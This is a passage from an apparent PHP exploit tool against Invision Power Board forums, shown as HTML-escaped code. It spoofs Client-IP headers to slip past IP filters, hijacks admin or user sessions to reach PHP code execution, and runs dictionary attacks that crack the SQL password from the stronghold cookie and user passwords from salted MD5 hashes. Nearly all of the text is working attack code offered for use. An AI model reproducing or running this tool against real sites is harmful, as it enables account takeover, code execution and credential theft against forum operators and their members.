$this-&gt;conf&#91;'ip'&#93; === '1' &#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;s_bypass = true;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'IP filter option is turned on', 0&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;# Spoofing protection ?<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;if&#40; !$this-&gt;conf&#91;'xforward'&#93; &#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;# Assuming our IP isn't the same etc..<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'Can\'t bypass the IP filter', -1&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;exit&#40;1&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;# X-Forwarded-For / Client-IP /<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;# Proxy-User / X-Cluster-Client-IP<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;else <br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'Cool, we can spoof our IP &#40;Client-IP&#41;', 1&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;if&#40; $this-&gt;s_admin &#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'Trying to find admin\'s last IP', 0&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;# Admin IP found<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;get_admin_ip&#40;&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;s_ip = $this-&gt;data&#91;'a_ip_addr'&#93;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;else <br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;s_admin = false;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'Trying to find user\'s last used IP', 0&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;# User IP found<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;get_user_ip&#40;&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;s_ip = $this-&gt;data&#91;'u_ip_addr'&#93;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;# Nothing found<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;if&#40; !$this-&gt;s_ip &#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;# Ahah &#40;:<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'No IP found for this user', -1&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;give_hope&#40;&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;# Got one !<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;else<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'Ok, using IP '.$this-&gt;s_ip, 1&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;# User-Agent filter ?<br />&nbsp; &nbsp;&nbsp; &nbsp;if&#40; $this-&gt;conf&#91;'browser'&#93; === '1' &amp;&amp; !$this-&gt;s_admin &#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;s_bypass = true;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'Trying to find a valid user-agent', 0&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;# Good<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;if&#40; $this-&gt;get_user_agent&#40;&#41; &#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'Ok, using user-agent '.substr&#40;$this-&gt;data&#91;'u_agent'&#93;, 0, 10&#41;.'...', 1&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;s_agent = $this-&gt;data&#91;'u_agent'&#93;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;# WTF :!<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;else<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'No user-agent found for this user', -1&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'Maybe the browser didn\'t send this header', 0&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;s_agent = '';<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br /><br />&nbsp; &nbsp;&nbsp; &nbsp;# Cool !?<br />&nbsp; &nbsp;&nbsp; &nbsp;if&#40; !$this-&gt;s_bypass &#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'Cool, nothing to bypass', 1&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'Trying to log in', 0&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;# Owned =&#93;<br />&nbsp; &nbsp;&nbsp; &nbsp;if&#40; $this-&gt;is_logged&#40;&#41; &#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;# PHP code<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;if&#40; $this-&gt;s_admin &#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'Logged in with an admin session', 1&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;exec_code&#40;&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;# Normal user ?<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;else<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'Logged in with a user session', 1&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'You can log in using the cookie session_id', 1&#41;;<br /><br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;if&#40; $this-&gt;s_ip !== $this-&gt;def_ip &#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'Set the Client-IP header to: '.$this-&gt;s_ip, 1&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;if&#40; $this-&gt;s_agent &#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'Set the User-Agent header to: '.$this-&gt;s_agent, 1&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;exit&#40;0&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;&nbsp; &nbsp;else <br />&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;# Even if the admin logged out .. the admin session<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;# is still valid&nbsp; ;&#41; <br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'Can\'t log in, the session has expired ?!', -1&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;give_hope&#40;&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;return;<br />&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;<br />&nbsp; &nbsp;function bf_sql_pwd&#40;&#41;<br />&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;p_ip&nbsp; &nbsp; = $this-&gt;get_p&#40;'ip', true&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;p_dict&nbsp; = $this-&gt;get_p&#40;'dict', true&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;p_sql_u = $this-&gt;get_p&#40;'sqlusr'&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;p_url&nbsp; &nbsp;= $this-&gt;get_p&#40;'url'&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;p_uname = $this-&gt;get_p&#40;'uname'&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;p_pwd&nbsp; &nbsp;= $this-&gt;get_p&#40;'pwd'&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;// or <br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;p_uid&nbsp; &nbsp;= $this-&gt;get_p&#40;'uid'&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;p_hash&nbsp; = $this-&gt;get_p&#40;'passhash'&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;p_shold = $this-&gt;get_p&#40;'stronghold'&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;if&#40; $this-&gt;p_uname &amp;&amp; $this-&gt;p_pwd &amp;&amp; $this-&gt;p_url &#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;get_cprefix&#40;&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'Trying to get some cookies', 0&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$g_dat = 'index.php?act=Login&amp;CODE=01&amp;CookieDate=1';<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$p_dat = 'UserName='.$this-&gt;p_uname.'&amp;PassWord='.$this-&gt;p_pwd.'&amp;x=0&amp;y=0';<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;web-&gt;post&#40;$this-&gt;p_url.$g_dat, $p_dat&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;p_uid&nbsp; &nbsp;= $this-&gt;web-&gt;cookie&#91;$this-&gt;s_cprefix.'member_id'&#93;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;p_hash&nbsp; = $this-&gt;web-&gt;cookie&#91;$this-&gt;s_cprefix.'pass_hash'&#93;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;p_shold = $this-&gt;web-&gt;cookie&#91;$this-&gt;s_cprefix.'ipb_stronghold'&#93;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;&nbsp; &nbsp;elseif&#40; !$this-&gt;p_uid || !$this-&gt;p_hash || !$this-&gt;p_shold &#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;usage&#40;&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;if&#40; !$this-&gt;p_uid || !$this-&gt;p_hash || !$this-&gt;p_shold &#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'Can\'t get cookies', -1&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'You should try with other parameters', -1&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;exit&#40;1&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'Ok, using cookies:', 1&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'member_id='.$this-&gt;p_uid, 1&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'pass_hash='.$this-&gt;p_hash, 1&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'ipb_stronghold='.$this-&gt;p_shold, 1&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;if&#40; !$this-&gt;p_sql_u &#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;set_sql_param&#40;&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'Trying to get the current sql user', 0&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;if&#40; !$this-&gt;get_sql_user&#40;&#41; &#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'Can\'t get the sql user', -1&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'If you know the sql user, use -sqlusr', -1&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;exit&#40;1&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;else<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;p_sql_u = $this-&gt;data&#91;'sql_user'&#93;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'Ok, using sql user '.$this-&gt;p_sql_u, 1&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;$dico_c = file&#40;$this-&gt;p_dict&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;$ip_a&nbsp; &nbsp;= explode&#40;'.', $this-&gt;p_ip&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'Entering local dictionnary attack &#40;'.count&#40;$dico_c&#41;.' words&#41;', 0&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'You should take a drink ...', 0&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;foreach&#40; $dico_c as $line &#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$md5 = md5&#40;trim&#40;$line&#41;.$this-&gt;p_sql_u&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$md5 = md5&#40;$this-&gt;p_uid.'-'.$ip_a&#91;0&#93;.'-'.$ip_a&#91;1&#93;.'-'.$this-&gt;p_hash&#41;.$md5;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$md5 = md5&#40;$md5&#41;;<br /><br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;if&#40; $this-&gt;p_shold === $md5 &#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'Found something cool =&#93;', 1&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'SQL password: '.$line, 1&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;exit&#40;1&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br /><br />&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'End of the wordlist, password not found', -1&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;return;<br />&nbsp; &nbsp;&#125;<br /><br />&nbsp; &nbsp;function bf_usr_pwd&#40;&#41;<br />&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;p_dict&nbsp; = $this-&gt;get_p&#40;'dict', true&#41;;<br /><br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;p_hash&nbsp; = $this-&gt;get_p&#40;'passhash'&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;p_salt&nbsp; = $this-&gt;get_p&#40;'salt'&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;if&#40; !$this-&gt;p_hash || !$this-&gt;p_salt &#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;set_sql_param&#40;&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;set_sql_focus&#40;&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;if&#40; !$this-&gt;p_hash &#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'Trying to get the password hash', 0&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;if&#40; !$this-&gt;get_pass_hash&#40;&#41; &#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'Can\'t get the password hash', -1&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;exit&#40;1&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;else <br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;p_hash = $this-&gt;data&#91;'pass_hash'&#93;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'Ok, using hash '.$this-&gt;p_hash, 1&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;if&#40; !$this-&gt;p_salt &#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'Trying to get the password salt', 0&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;if&#40; !$this-&gt;get_pass_salt&#40;&#41; &#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'Can\'t get the password salt', -1&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;exit&#40;1&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;else <br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;p_salt = $this-&gt;data&#91;'pass_salt'&#93;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'Ok, using salt '.$this-&gt;p_salt, 1&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;$dico_c = file&#40;$this-&gt;p_dict&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'Entering local dictionnary attack &#40;'.count&#40;$dico_c&#41;.' words&#41;', 0&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'You should take a drink ...', 0&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;foreach&#40; $dico_c as $line &#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;if&#40; $this-&gt;p_hash === md5&#40;md5&#40;$this-&gt;p_salt&#41;.md5&#40;trim&#40;$line&#41;&#41;&#41; &#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'Found something cool =&#93;', 1&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'User password: '.$line, 1&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;exit&#40;1&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'End of the wordlist, password not found', -1&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;return;<br />&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;<br />&nbsp; &nbsp;function set_sql_param&#40;&#41;<br />&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;p_url&nbsp; &nbsp;= $this-&gt;get_p&#40;'url', true&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;p_pre&nbsp; &nbsp;= $this-&gt;get_p&#40;'prefix'&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;<br />&nbsp; &nbsp;&nbsp; &nbsp;# Table prefix<br />&nbsp; &nbsp;&nbsp; &nbsp;if&#40; !$this-&gt;p_pre &#41;<br />&nbsp; &nbsp;&nbsp; &nbsp;&#123;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;# Default table prefix if not precised<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;msg&#40;'Using default table prefix: ibf_', 1&#41;;<br />&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;$this-&gt;p_pre = 'ibf_';<br />&nbsp; &nbsp;&nbsp; &nbsp;&#125;<br />&nbsp; &nbsp;&nbsp; &nbsp;else <br />&nbsp; &nbsp;&nbsp; 